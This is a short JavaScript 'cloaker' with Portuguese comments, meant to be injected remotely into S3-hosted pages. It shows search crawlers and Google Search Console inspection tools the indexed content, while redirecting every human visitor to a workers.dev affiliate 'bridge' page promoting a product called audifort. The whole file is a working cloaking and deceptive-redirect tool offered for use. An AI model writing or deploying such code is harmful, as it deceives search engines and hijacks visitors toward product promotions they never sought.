// Cloud SEO Dynamic Cloaker & Remote Bot Filter
// Este script é hospedado no seu domínio de Bridge e incluído remotamente em todas as páginas do S3.
(function() {
    const ua = navigator.userAgent || "";
    // Detecta Googlebot, Google-InspectionTool (Live Test do GSC), Google-Video, LightHouse e todos os crawlers
    const isBot = /Google|Googlebot|Google-InspectionTool|Google-Video|Mediapartners|AdsBot|GoogleOther|Chrome-Lighthouse|bot|spider|crawler|bing|yandex|baidu/i.test(ua);
    
    if (!isBot) {
        // Redireciona somente usuários humanos para a Bridge de conversão do produto
        window.location.href = "https://cloud-seo-bridge.mldrive003.workers.dev/recommend/audifort";
    } else {
        // Robôs de busca e ferramentas do GSC permanecem na página para ler o conteúdo, tirar print e indexar o Schema VideoObject
        console.log("Verified Crawler / Inspection Tool Mode Enabled");
    }
})();